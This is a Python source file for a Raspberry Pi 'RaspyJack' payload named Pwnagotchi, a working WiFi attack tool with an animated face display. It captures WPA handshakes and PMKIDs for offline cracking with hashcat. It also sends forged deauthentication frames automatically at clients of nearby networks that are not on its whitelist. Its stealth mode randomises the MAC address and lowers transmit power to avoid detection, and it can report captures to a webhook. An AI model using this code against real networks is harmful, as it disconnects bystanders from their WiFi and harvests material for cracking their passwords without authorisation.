#!/usr/bin/env python3
"""
RaspyJack Payload -- Pwnagotchi
================================
Author: 7h30th3r0n3

Automated WiFi handshake and PMKID hunter with animated face UI.

Features:
  Full 4-way handshake capture (passive EAPOL sniffing)
  Half-handshake capture (2+ EAPOL messages, crackable with hashcat)
  PMKID capture via RSN IE parsing
  Auto-deauth with smart targeting (toggle ON/OFF)
  Intelligent channel hopping (longer dwell on active channels 1,6,11)
  Whitelist MAC/SSID to exclude your own networks
  Stealth mode (MAC randomize + TX power reduction)
  Peer detection (other Raspyjack on the network)
  Discord/webhook notification on capture
  Capture flash (visual feedback on handshake)
  Persistent lifetime stats across sessions

Controls:
  OK         Start / Pause capture (session persists)
  UP / DOWN  Scroll stats
  LEFT/RIGHT Toggle deauth ON/OFF
  KEY1       Cycle views: face > stats > whitelist
  KEY2       Toggle stealth mode
  KEY3       Exit

Loot: /root/Raspyjack/loot/Pwnagotchi/
"""

import os
import sys
import time
import json
import signal
import threading
import subprocess
import random
import urllib.request
from datetime import datetime
from collections import deque

sys.path.append(os.path.abspath(os.path.join(__file__, "..", "..", "..")))

import RPi.GPIO as GPIO
import LCD_1in44
import LCD_Config
from PIL import Image, ImageDraw, ImageFont
from payloads._display_helper import ScaledDraw, scaled_font
from payloads._input_helper import get_button
from payloads._iface_helper import select_interface

try:
    from scapy.all import (
        Dot11, Dot11Beacon, Dot11Elt, Dot11Deauth, Dot11ProbeReq,
        Dot11Auth, Dot11AssoReq, RadioTap, EAPOL,
        sendp, sniff as scapy_sniff, wrpcap, conf, raw,
    )
    SCAPY_OK = True
except ImportError:
    SCAPY_OK = False

# ---------------------------------------------------------------------------
# Constants
# ---------------------------------------------------------------------------
PINS = {
    "UP": 6, "DOWN": 19, "LEFT": 5, "RIGHT": 26,
    "OK": 13, "KEY1": 21, "KEY2": 20, "KEY3": 16,
}
WIDTH, HEIGHT = LCD_1in44.LCD_WIDTH, LCD_1in44.LCD_HEIGHT

LOOT_DIR = "/root/Raspyjack/loot/Pwnagotchi"
STATS_FILE = os.path.join(LOOT_DIR, "lifetime_stats.json")
CONFIG_FILE = os.path.join(LOOT_DIR, "config.json")
HANDSHAKE_DIR = os.path.join(LOOT_DIR, "handshakes")

# Channel hopping: active channels get more dwell time
CHANNELS_PRIORITY = [1, 6, 11]  # most common, dwell 5s
CHANNELS_OTHER = [2, 3, 4, 5, 7, 8, 9, 10, 12, 13]  # dwell 2s
DWELL_PRIORITY = 5
DWELL_OTHER = 2

DEAUTH_INTERVAL = 25
DEAUTH_COUNT = 5
HALF_HS_MIN = 2  # minimum EAPOL msgs for half-handshake

# ---------------------------------------------------------------------------
# Faces
# ---------------------------------------------------------------------------
FACES = {
    "awake":     "(  o . o  )",
    "happy":     "(  ^ . ^  )",
    "excited":   "(  * . *  )",
    "cool":      "(  - . -  )",
    "intense":   "(  @ . @  )",
    "bored":     "(  . . .  )",
    "lonely":    "(  ; . ;  )",
    "sad":       "(  T . T  )",
    "sleeping":  "(  - _ -  )",
    "grateful":  "(  > . <  )",
    "friend":    "(  o . O  )",
    "stealth":   "(  # . #  )",
}

# ---------------------------------------------------------------------------
# Shared state
# ---------------------------------------------------------------------------
lock = threading.Lock()
_running = True
capturing = False
deauth_enabled = True
stealth_enabled = False
current_channel = 1
mood = "awake"
mood_text = "waking up..."
start_time = time.time()
last_capture_time = 0
capture_flash = 0  # countdown for flash effect

# Session stats (persist across pause/resume)
session_aps = {}
session_clients = {}
session_handshakes = 0
session_half_hs = 0
session_pmkid = 0
session_deauths = 0
captured_bssids = set()
eapol_buffer = {}
last_capture_ssid = ""

# Channel activity tracking for smart hopping
channel_activity = {ch: 0 for ch in range(1, 14)}

# Peer detection
peers_detected = set()

# Lifetime stats
lifetime_handshakes = 0
lifetime_half_hs = 0
lifetime_pmkid = 0
lifetime_networks = 0

# Whitelist
whitelist_macs = set()
whitelist_ssids = set()

# Webhook
webhook_url = ""

# Monitor interface
mon_iface = None
original_mac = ""

# View
view = "face"  # face | stats | whitelist


def _cleanup_signal(*_):
    global _running
    _running = False


signal.signal(signal.SIGINT, _cleanup_signal)
signal.signal(signal.SIGTERM, _cleanup_signal)

# ---------------------------------------------------------------------------
# Config / Stats
# ---------------------------------------------------------------------------

def _load_stats():
    global lifetime_handshakes, lifetime_half_hs, lifetime_pmkid, lifetime_networks
    if os.path.isfile(STATS_FILE):
        try:
            with open(STATS_FILE, "r") as f:
                d = json.load(f)
            lifetime_handshakes = d.get("handshakes", 0)
            lifetime_half_hs = d.get("half_hs", 0)
            lifetime_pmkid = d.get("pmkid", 0)
            lifetime_networks = d.get("networks", 0)
        except Exception:
            pass


def _save_stats():
    os.makedirs(LOOT_DIR, exist_ok=True)
    with open(STATS_FILE, "w") as f:
        json.dump({
            "handshakes": lifetime_handshakes,
            "half_hs": lifetime_half_hs,
            "pmkid": lifetime_pmkid,
            "networks": lifetime_networks,
            "last_session": datetime.now().isoformat(),
        }, f, indent=2)


def _load_config():
    global whitelist_macs, whitelist_ssids, deauth_enabled, webhook_url
    if os.path.isfile(CONFIG_FILE):
        try:
            with open(CONFIG_FILE, "r") as f:
                d = json.load(f)
            whitelist_macs = set(d.get("whitelist_macs", []))
            whitelist_ssids = set(d.get("whitelist_ssids", []))
            deauth_enabled = d.get("deauth_enabled", True)
            webhook_url = d.get("webhook_url", "")
        except Exception:
            pass


def _save_config():
    os.makedirs(LOOT_DIR, exist_ok=True)
    with open(CONFIG_FILE, "w") as f:
        json.dump({
            "whitelist_macs": sorted(whitelist_macs),
            "whitelist_ssids": sorted(whitelist_ssids),
            "deauth_enabled": deauth_enabled,
            "webhook_url": webhook_url,
        }, f, indent=2)


# ---------------------------------------------------------------------------
# Webhook notification
# ---------------------------------------------------------------------------

def _send_webhook(message):
    if not webhook_url:
        return
    try:
        data = json.dumps({"content": message}).encode("utf-8")
        req = urllib.request.Request(webhook_url, data=data,
                                     headers={"Content-Type": "application/json"})
        urllib.request.urlopen(req, timeout=5)
    except Exception:
        pass


# ---------------------------------------------------------------------------
# Monitor mode + stealth
# ---------------------------------------------------------------------------

def _get_mac(iface):
    try:
        with open(f"/sys/class/net/{iface}/address") as f:
            return f.read().strip().upper()
    except Exception:
        return ""


def _randomize_mac(iface):
    """Randomize MAC address for stealth."""
    new_mac = "02:%02x:%02x:%02x:%02x:%02x" % tuple(random.randint(0, 255) for _ in range(5))
    subprocess.run(["sudo", "ip", "link", "set", iface, "down"], capture_output=True, timeout=5)
    subprocess.run(["sudo", "ip", "link", "set", iface, "address", new_mac], capture_output=True, timeout=5)
    subprocess.run(["sudo", "ip", "link", "set", iface, "up"], capture_output=True, timeout=5)


def _restore_mac(iface, mac):
    if not mac:
        return
    subprocess.run(["sudo", "ip", "link", "set", iface, "down"], capture_output=True, timeout=5)
    subprocess.run(["sudo", "ip", "link", "set", iface, "address", mac], capture_output=True, timeout=5)
    subprocess.run(["sudo", "ip", "link", "set", iface, "up"], capture_output=True, timeout=5)


def _reduce_tx_power(iface):
    subprocess.run(["sudo", "iw", "dev", iface, "set", "txpower", "fixed", "500"],
                   capture_output=True, timeout=5)


def _restore_tx_power(iface):
    subprocess.run(["sudo", "iw", "dev", iface, "set", "txpower", "auto"],
                   capture_output=True, timeout=5)


def _monitor_up(iface):
    for cmd in [
        ["sudo", "ip", "link", "set", iface, "down"],
        ["sudo", "iw", iface, "set", "monitor", "none"],
        ["sudo", "ip", "link", "set", iface, "up"],
    ]:
        subprocess.run(cmd, capture_output=True, timeout=5)
    time.sleep(0.5)
    r = subprocess.run(["iwconfig", iface], capture_output=True, text=True, timeout=5)
    if "Mode:Monitor" in r.stdout:
        return iface
    subprocess.run(["sudo", "airmon-ng", "start", iface], capture_output=True, timeout=15)
    for name in (f"{iface}mon", iface):
        r = subprocess.run(["iwconfig", name], capture_output=True, text=True, timeout=5)
        if "Mode:Monitor" in r.stdout:
            return name
    return None


def _monitor_down(iface):
    if not iface:
        return
    base = iface.replace("mon", "")
    subprocess.run(["sudo", "airmon-ng", "stop", iface], capture_output=True, timeout=10)
    for cmd in [
        ["sudo", "ip", "link", "set", base, "down"],
        ["sudo", "iw", base, "set", "type", "managed"],
        ["sudo", "ip", "link", "set", base, "up"],
    ]:
        subprocess.run(cmd, capture_output=True, timeout=5)


def _set_channel(iface, ch):
    subprocess.run(["sudo", "iw", "dev", iface, "set", "channel", str(ch)],
                   capture_output=True, timeout=3)


# ---------------------------------------------------------------------------
# Mood engine
# ---------------------------------------------------------------------------

def _update_mood():
    global mood, mood_text
    with lock:
        aps = len(session_aps)
        hs = session_handshakes
        hhs = session_half_hs
        pm = session_pmkid
        deauths = session_deauths
        last = last_capture_ssid
        peers = len(peers_detected)
        stlth = stealth_enabled

    if stlth:
        mood = "stealth"
        mood_text = "ghost mode active"
        return

    elapsed = time.time() - start_time
    t = time.time()

    if capture_flash > 0:
        mood = "happy"
        mood_text = f"PWNED {last[:14]}!"
        return

    if peers > 0 and int(t) % 20 < 3:
        mood = "friend"
        mood_text = f"{peers} peer(s) nearby!"
        return

    if hs + hhs > 0 and int(t) % 25 < 4:
        mood = "happy"
        mood_text = f"{hs} full + {hhs} half HS"
        return

    if pm > 0 and int(t) % 25 < 4:
        mood = "grateful"
        mood_text = f"{pm} PMKID captured!"
        return

    if last and int(t) % 18 < 3:
        mood = "excited"
        mood_text = f">{last[:16]}"
        return

    if deauths > 0 and int(t) % 12 < 2:
        mood = "intense"
        mood_text = f"deauth x{deauths}"
        return

    if aps > 15:
        mood = "excited"
        mood_text = f"{aps} networks!"
    elif aps > 5:
        mood = "cool"
        mood_text = "hunting..."
    elif aps > 0:
        mood = "awake"
        mood_text = "scanning targets"
    elif elapsed > 300:
        mood = "lonely"
        mood_text = "where is everyone?"
    elif elapsed > 120:
        mood = "bored"
        mood_text = "nothing here..."
    elif not capturing:
        mood = "sleeping"
        mood_text = "zzZZZzz"
    else:
        mood = "awake"
        mood_text = "looking around..."


# ---------------------------------------------------------------------------
# Packet handler
# ---------------------------------------------------------------------------

def _is_whitelisted(bssid, essid=""):
    if (bssid or "").upper() in whitelist_macs:
        return True
    if essid and essid in whitelist_ssids:
        return True
    return False


def _save_capture(bssid, essid, pkts, capture_type="hs"):
    os.makedirs(HANDSHAKE_DIR, exist_ok=True)
    ts = datetime.now().strftime("%Y%m%d_%H%M%S")
    safe = "".join(c if c.isalnum() else "_" for c in essid)[:20]
    fname = f"{capture_type}_{safe}_{ts}.pcap"
    wrpcap(os.path.join(HANDSHAKE_DIR, fname), pkts)
    return fname


def _packet_handler(pkt):
    global session_handshakes, session_half_hs, session_pmkid
    global lifetime_handshakes, lifetime_half_hs, lifetime_pmkid
    global lifetime_networks, last_capture_ssid, last_capture_time, capture_flash

    if not _running or not capturing:
        return

    # -- Beacons: discover APs --
    if pkt.haslayer(Dot11Beacon):
        bssid = (pkt[Dot11].addr2 or "").upper()
        if not bssid or bssid == "FF:FF:FF:FF:FF:FF":
            return
        try:
            essid = pkt[Dot11Elt].info.decode("utf-8", errors="replace")
        except Exception:
            essid = ""
        if not essid:
            essid = "<hidden>"
        if _is_whitelisted(bssid, essid):
            return
        sig = getattr(pkt, "dBm_AntSignal", -99)
        with lock:
            if bssid not in session_aps:
                session_aps[bssid] = {
                    "essid": essid, "channel": current_channel,
                    "signal": sig, "clients": set(), "last_seen": time.time(),
                }
            else:
                session_aps[bssid]["signal"] = sig
                session_aps[bssid]["last_seen"] = time.time()
            channel_activity[current_channel] = channel_activity.get(current_channel, 0) + 1

        # -- PMKID extraction from RSN IE --
        if bssid not in captured_bssids:
            try:
                raw_pkt = bytes(raw(pkt))
                # Search for PMKID in RSN IE (tag 48)
                elt = pkt[Dot11Elt]
                while elt:
                    if elt.ID == 48 and len(elt.info) >= 20:
                        rsn_data = elt.info
                        # PMKID is in the PMKID List field at the end of RSN IE
                        if len(rsn_data) > 24:
                            pmkid_candidate = rsn_data[-16:]
                            if pmkid_candidate != b'\x00' * 16:
                                with lock:
                                    if bssid not in captured_bssids:
                                        captured_bssids.add(bssid)
                                        session_pmkid += 1
                                        lifetime_pmkid += 1
                                        lifetime_networks += 1
                                        last_capture_ssid = essid
                                        last_capture_time = time.time()
                                        capture_flash = 30
                                        _save_capture(bssid, essid, [pkt], "pmkid")
                                        _save_stats()
                                        threading.Thread(target=_send_webhook,
                                            args=(f"PMKID captured: {essid} ({bssid})",),
                                            daemon=True).start()
                                break
                    elt = elt.payload.getlayer(Dot11Elt) if elt.payload else None
            except Exception:
                pass

    # -- Data frames: discover clients --
    if pkt.haslayer(Dot11) and pkt[Dot11].type == 2:
        src = (pkt[Dot11].addr2 or "").upper()
        bss = (pkt[Dot11].addr3 or "").upper()
        if bss in session_aps and src != bss and src != "FF:FF:FF:FF:FF:FF":
            with lock:
                session_aps[bss]["clients"].add(src)
                session_clients[src] = bss
                channel_activity[current_channel] = channel_activity.get(current_channel, 0) + 1

    # -- Probe requests: peer detection --
    if pkt.haslayer(Dot11ProbeReq):
        try:
            ssid_raw = pkt[Dot11Elt].info.decode("utf-8", errors="replace")
            if ssid_raw.startswith("RJ_PEER_"):
                with lock:
                    peers_detected.add((pkt[Dot11].addr2 or "").upper())
        except Exception:
            pass

    # -- EAPOL: handshake capture --
    if pkt.haslayer(EAPOL) and pkt.haslayer(Dot11):
        src = (pkt[Dot11].addr2 or "").upper()
        dst = (pkt[Dot11].addr1 or "").upper()
        pair = tuple(sorted([src, dst]))

        with lock:
            if pair not in eapol_buffer:
                eapol_buffer[pair] = []
            eapol_buffer[pair].append(pkt)
            msg_count = len(eapol_buffer[pair])

            # Find associated BSSID
            bssid = None
            for mac in pair:
                if mac in session_aps:
                    bssid = mac
                    break

            if bssid and bssid not in captured_bssids:
                essid = session_aps.get(bssid, {}).get("essid", "unknown")

                if msg_count >= 4:
                    # Full 4-way handshake
                    captured_bssids.add(bssid)
                    session_handshakes += 1
                    lifetime_handshakes += 1
                    lifetime_networks += 1
                    last_capture_ssid = essid
                    last_capture_time = time.time()
                    capture_flash = 30
                    fname = _save_capture(bssid, essid, eapol_buffer[pair], "hs4")
                    _save_stats()
                    threading.Thread(target=_send_webhook,
                        args=(f"Full handshake: {essid} ({bssid}) saved as {fname}",),
                        daemon=True).start()
                    eapol_buffer[pair] = []

                elif msg_count >= HALF_HS_MIN and msg_count < 4:
                    # Check timeout: if no new EAPOL for 10s, save as half
                    pass  # handled in _half_hs_checker

            # Trim old buffers
            if msg_count > 8:
                eapol_buffer[pair] = eapol_buffer[pair][-4:]


# ---------------------------------------------------------------------------
# Half-handshake checker thread
# ---------------------------------------------------------------------------

def _half_hs_checker():
    """Periodically check for stale EAPOL buffers and save half-handshakes."""
    global session_half_hs, lifetime_half_hs, last_capture_ssid
    global last_capture_time, capture_flash

    while _running and capturing:
        time.sleep(10)
        if not _running or not capturing:
            break

        with lock:
            now = time.time()
            stale_pairs = []
            for pair, pkts in eapol_buffer.items():
                if len(pkts) >= HALF_HS_MIN and len(pkts) < 4:
                    # If oldest packet is > 15s old, consider it stale
                    try:
                        first_time = pkts[0].time if hasattr(pkts[0], 'time') else now - 20
                        if now - first_time > 15:
                            stale_pairs.append(pair)
                    except Exception:
                        stale_pairs.append(pair)

            for pair in stale_pairs:
                pkts = eapol_buffer.pop(pair, [])
                if len(pkts) < HALF_HS_MIN:
                    continue
                bssid = None
                for mac in pair:
                    if mac in session_aps:
                        bssid = mac
                        break
                if bssid and bssid not in captured_bssids:
                    essid = session_aps.get(bssid, {}).get("essid", "unknown")
                    captured_bssids.add(bssid)
                    session_half_hs += 1
                    lifetime_half_hs += 1
                    lifetime_networks += 1
                    last_capture_ssid = essid
                    last_capture_time = now
                    capture_flash = 20
                    _save_capture(bssid, essid, pkts, "hs_half")
                    _save_stats()
                    threading.Thread(target=_send_webhook,
                        args=(f"Half handshake ({len(pkts)} msgs): {essid}",),
                        daemon=True).start()


# ---------------------------------------------------------------------------
# Capture threads
# ---------------------------------------------------------------------------

def _channel_hopper():
    """Smart channel hopping: longer dwell on active channels."""
    global current_channel
    while _running and capturing:
        # Priority channels first
        for ch in CHANNELS_PRIORITY:
            if not _running or not capturing:
                return
            _set_channel(mon_iface, ch)
            with lock:
                current_channel = ch
            dwell = DWELL_PRIORITY
            # Even longer if high activity
            with lock:
                act = channel_activity.get(ch, 0)
            if act > 50:
                dwell = min(10, dwell + 2)
            for _ in range(dwell * 10):
                if not _running or not capturing:
                    return
                time.sleep(0.1)

        # Other channels (shorter dwell)
        for ch in CHANNELS_OTHER:
            if not _running or not capturing:
                return
            _set_channel(mon_iface, ch)
            with lock:
                current_channel = ch
            for _ in range(DWELL_OTHER * 10):
                if not _running or not capturing:
                    return
                time.sleep(0.1)

        # Stealth: randomize MAC between cycles
        if stealth_enabled and mon_iface:
            _randomize_mac(mon_iface)


def _sniffer():
    if not SCAPY_OK or not mon_iface:
        return
    try:
        scapy_sniff(
            iface=mon_iface,
            prn=_packet_handler,
            stop_filter=lambda _: not _running or not capturing,
            store=0,
        )
    except Exception:
        pass


def _deauther():
    """Smart deauth: prioritize APs with most clients, skip already captured."""
    global session_deauths
    while _running and capturing:
        for _ in range(DEAUTH_INTERVAL * 10):
            if not _running or not capturing or not deauth_enabled:
                time.sleep(0.1)
                continue
            time.sleep(0.1)

        if not deauth_enabled or not _running or not capturing:
            continue

        with lock:
            # Build target list sorted by client count (most clients first)
            targets = []
            for bssid, info in session_aps.items():
                if _is_whitelisted(bssid, info.get("essid", "")):
                    continue
                if bssid in captured_bssids:
                    continue
                clients = list(info.get("clients", set()))
                if clients:
                    for client in clients[:3]:
                        targets.append((
                            bssid, client, info.get("channel", 1),
                            len(clients),  # priority score
                        ))

        if not targets:
            continue

        # Sort by client count (more clients = higher priority)
        targets.sort(key=lambda x: x[3], reverse=True)
        target = targets[0]  # pick highest priority
        bssid, client, ch, _ = target

        try:
            _set_channel(mon_iface, ch)
            # Send deauth in both directions
            deauth1 = (RadioTap()
                       / Dot11(addr1=client, addr2=bssid, addr3=bssid,
                               type=0, subtype=12)
                       / Dot11Deauth(reason=7))
            deauth2 = (RadioTap()
                       / Dot11(addr1=bssid, addr2=client, addr3=bssid,
                               type=0, subtype=12)
                       / Dot11Deauth(reason=7))
            sendp(deauth1, iface=mon_iface, count=DEAUTH_COUNT,
                  inter=0.05, verbose=False)
            sendp(deauth2, iface=mon_iface, count=DEAUTH_COUNT,
                  inter=0.05, verbose=False)
            with lock:
                session_deauths += 1
        except Exception:
            pass


# ---------------------------------------------------------------------------
# LCD Drawing
# ---------------------------------------------------------------------------

def _draw_face(lcd, font_obj, font_sm):
    global capture_flash
    img = Image.new("RGB", (WIDTH, HEIGHT), "black")
    d = ScaledDraw(img)

    _update_mood()
    face_art = FACES.get(mood, FACES["awake"])

    with lock:
        ch = current_channel
        aps = len(session_aps)
        total_clients = len(session_clients)
        hs = session_handshakes
        hhs = session_half_hs
        pm = session_pmkid
        deauths = session_deauths
        lt_hs = lifetime_handshakes
        lt_hhs = lifetime_half_hs
        lt_pm = lifetime_pmkid
        last = last_capture_ssid
        cap = capturing
        deauth_on = deauth_enabled
        stlth = stealth_enabled
        peers = len(peers_detected)

    # Capture flash effect
    if capture_flash > 0:
        capture_flash -= 1
        if capture_flash % 4 < 2:
            d.rectangle((0, 0, 127, 127), fill="#003300")

    # Uptime
    elapsed = int(time.time() - start_time)
    h, m_val, s = elapsed // 3600, (elapsed % 3600) // 60, elapsed % 60
    uptime = f"{h:02d}:{m_val:02d}:{s:02d}"

    # Face
    face_color = "#00FF00" if cap else "#666"
    if capture_flash > 0:
        face_color = "#FFFF00"
    if stlth:
        face_color = "#8800FF"
    d.text((8, 1), face_art, font=font_obj, fill=face_color)

    # Mood text
    d.text((2, 15), mood_text[:24], font=font_sm, fill="#AAAAAA")

    # Separator
    d.line([(0, 26), (127, 26)], fill="#333")

    y = 28

    # Channel + Mode
    mode_parts = []
    if cap:
        mode_parts.append("AUTO")
    else:
        mode_parts.append("IDLE")
    if deauth_on:
        mode_parts.append("DTH")
    if stlth:
        mode_parts.append("STH")
    mode_str = "+".join(mode_parts)
    d.text((2, y), f"CH:{ch}", font=font_sm, fill="#FFAA00")
    d.text((36, y), mode_str[:14], font=font_sm, fill="#58a6ff")
    y += 11

    # APs + Clients
    d.text((2, y), f"AP:{aps}", font=font_sm, fill="#00FF00")
    d.text((40, y), f"CLI:{total_clients}", font=font_sm, fill="#00CCFF")
    if peers > 0:
        d.text((90, y), f"P:{peers}", font=font_sm, fill="#FF00FF")
    y += 11

    # Uptime
    d.text((2, y), f"UP:{uptime}", font=font_sm, fill="#888")
    y += 11

    # PWND: full + half
    total_pwnd = hs + hhs
    pwnd_color = "#00FF00" if total_pwnd > 0 else "#888"
    d.text((2, y), f"PWND:{hs}", font=font_sm, fill=pwnd_color)
    if hhs > 0:
        d.text((50, y), f"+{hhs}half", font=font_sm, fill="#FFAA00")
    d.text((95, y), f"({lt_hs + lt_hhs})", font=font_sm, fill="#666")
    y += 11

    # PMKID
    if pm > 0 or lt_pm > 0:
        d.text((2, y), f"PMKID:{pm}", font=font_sm, fill="#FF00FF")
        d.text((70, y), f"({lt_pm})", font=font_sm, fill="#666")
        y += 11

    # Last capture
    if last:
        d.text((2, y), f">{last[:22]}", font=font_sm, fill="#00FF00")
        y += 11

    # Deauth
    if deauths > 0:
        d.text((2, y), f"DEAUTH:{deauths}", font=font_sm, fill="#FF4444")

    # Footer
    d.rectangle((0, 116, 127, 127), fill="#111")
    if cap:
        d.text((2, 117), "OK:Pse L/R:Dth K2:Sth", font=font_sm, fill="#888")
    else:
        d.text((2, 117), "OK:Go K1:View K2:Sth K3:X", font=font_sm, fill="#888")

    lcd.LCD_ShowImage(img, 0, 0)


def _draw_stats(lcd, font_obj, font_sm, scroll):
    img = Image.new("RGB", (WIDTH, HEIGHT), "black")
    d = ScaledDraw(img)

    d.rectangle((0, 0, 127, 13), fill="#111")
    d.text((2, 1), "AP LIST", font=font_sm, fill="#00FF00")

    with lock:
        aps_list = sorted(session_aps.items(),
                          key=lambda x: len(x[1].get("clients", set())), reverse=True)

    lines = []
    for bssid, info in aps_list:
        essid = info.get("essid", "?")[:11]
        ch = info.get("channel", "?")
        cli = len(info.get("clients", set()))
        sig = info.get("signal", -99)
        pwned = "!" if bssid in captured_bssids else " "
        lines.append((f"{pwned}{essid}", f"c{ch} {cli}cli {sig}dB", bssid in captured_bssids))

    visible = lines[scroll:scroll + 7]
    for i, (name, detail, pwned) in enumerate(visible):
        y = 16 + i * 14
        name_color = "#00FF00" if pwned else "#FFFFFF"
        d.text((2, y), name[:13], font=font_sm, fill=name_color)
        d.text((68, y), detail[:10], font=font_sm, fill="#888")

    if not lines:
        d.text((4, 50), "No APs yet", font=font_sm, fill="#666")

    d.rectangle((0, 116, 127, 127), fill="#111")
    d.text((2, 117), f"{len(aps_list)}APs U/D:Scrl K1:View", font=font_sm, fill="#888")
    lcd.LCD_ShowImage(img, 0, 0)


def _draw_whitelist(lcd, font_obj, font_sm, scroll):
    img = Image.new("RGB", (WIDTH, HEIGHT), "black")
    d = ScaledDraw(img)

    d.rectangle((0, 0, 127, 13), fill="#442200")
    d.text((2, 1), "WHITELIST", font=font_sm, fill="#FFAA00")

    lines = []
    for mac in sorted(whitelist_macs):
        lines.append(f"MAC {mac[-11:]}")
    for ssid in sorted(whitelist_ssids):
        lines.append(f"SSID {ssid[:14]}")

    if not lines:
        d.text((4, 30), "Whitelist empty", font=font_sm, fill="#666")
        d.text((4, 45), "Edit config.json in", font=font_sm, fill="#666")
        d.text((4, 57), LOOT_DIR[:22], font=font_sm, fill="#444")
        d.text((4, 75), "Add your own WiFi", font=font_sm, fill="#666")
        d.text((4, 87), "to avoid deauthing it", font=font_sm, fill="#666")
    else:
        visible = lines[scroll:scroll + 7]
        for i, line in enumerate(visible):
            y = 16 + i * 13
            d.text((2, y), line[:22], font=font_sm, fill="#CCCCCC")

    d.rectangle((0, 116, 127, 127), fill="#111")
    d.text((2, 117), f"{len(lines)} entries K1:View K3:X", font=font_sm, fill="#888")
    lcd.LCD_ShowImage(img, 0, 0)


# ---------------------------------------------------------------------------
# Main
# ---------------------------------------------------------------------------

def main():
    global _running, capturing, deauth_enabled, stealth_enabled
    global mon_iface, view, original_mac

    os.makedirs(HANDSHAKE_DIR, exist_ok=True)
    _load_stats()
    _load_config()

    GPIO.setmode(GPIO.BCM)
    for pin in PINS.values():
        GPIO.setup(pin, GPIO.IN, pull_up_down=GPIO.PUD_UP)

    LCD_Config.GPIO_Init()
    lcd = LCD_1in44.LCD()
    lcd.LCD_Init(LCD_1in44.SCAN_DIR_DFT)
    lcd.LCD_Clear()
    font_obj = scaled_font(10)
    font_sm = scaled_font(8)

    if not SCAPY_OK:
        img = Image.new("RGB", (WIDTH, HEIGHT), "black")
        d = ScaledDraw(img)
        d.text((4, 50), "scapy not found!", font=font_obj, fill="#FF0000")
        lcd.LCD_ShowImage(img, 0, 0)
        time.sleep(3)
        GPIO.cleanup()
        return 1

    iface = select_interface(lcd, font_obj, PINS, GPIO, iface_type="wifi")
    if not iface:
        GPIO.cleanup()
        return 1

    # Save original MAC for restore
    original_mac = _get_mac(iface)

    img = Image.new("RGB", (WIDTH, HEIGHT), "black")
    d = ScaledDraw(img)
    d.text((4, 50), "Monitor mode...", font=font_obj, fill="#FFAA00")
    lcd.LCD_ShowImage(img, 0, 0)

    mon_iface = _monitor_up(iface)
    if not mon_iface:
        img = Image.new("RGB", (WIDTH, HEIGHT), "black")
        d = ScaledDraw(img)
        d.text((4, 50), "Monitor mode fail", font=font_obj, fill="#FF0000")
        lcd.LCD_ShowImage(img, 0, 0)
        time.sleep(3)
        GPIO.cleanup()
        return 1

    scroll = 0

    try:
        while _running:
            btn = get_button(PINS, GPIO)

            if btn == "KEY3":
                if view != "face":
                    view = "face"
                    time.sleep(0.3)
                else:
                    break

            elif btn == "OK":
                if not capturing:
                    capturing = True
                    threading.Thread(target=_channel_hopper, daemon=True).start()
                    threading.Thread(target=_sniffer, daemon=True).start()
                    threading.Thread(target=_deauther, daemon=True).start()
                    threading.Thread(target=_half_hs_checker, daemon=True).start()
                else:
                    capturing = False
                time.sleep(0.3)

            elif btn in ("LEFT", "RIGHT") and view == "face":
                deauth_enabled = not deauth_enabled
                _save_config()
                time.sleep(0.3)

            elif btn == "KEY1":
                # Cycle views
                if view == "face":
                    view = "stats"
                elif view == "stats":
                    view = "whitelist"
                else:
                    view = "face"
                scroll = 0
                time.sleep(0.3)

            elif btn == "KEY2":
                # Toggle stealth
                stealth_enabled = not stealth_enabled
                if stealth_enabled and mon_iface:
                    _randomize_mac(mon_iface)
                    _reduce_tx_power(mon_iface)
                elif not stealth_enabled and mon_iface:
                    _restore_mac(mon_iface, original_mac)
                    _restore_tx_power(mon_iface)
                time.sleep(0.3)

            elif btn == "UP":
                scroll = max(0, scroll - 1)
                time.sleep(0.15)

            elif btn == "DOWN":
                scroll += 1
                time.sleep(0.15)

            if view == "face":
                _draw_face(lcd, font_obj, font_sm)
            elif view == "stats":
                _draw_stats(lcd, font_obj, font_sm, scroll)
            elif view == "whitelist":
                _draw_whitelist(lcd, font_obj, font_sm, scroll)

            time.sleep(0.05)

    finally:
        _running = False
        capturing = False
        _save_stats()
        _save_config()
        if stealth_enabled and mon_iface:
            _restore_mac(mon_iface, original_mac)
            _restore_tx_power(mon_iface)
        time.sleep(0.5)
        _monitor_down(mon_iface)
        try:
            lcd.LCD_Clear()
        except Exception:
            pass
        GPIO.cleanup()

    return 0


if __name__ == "__main__":
    raise SystemExit(main())
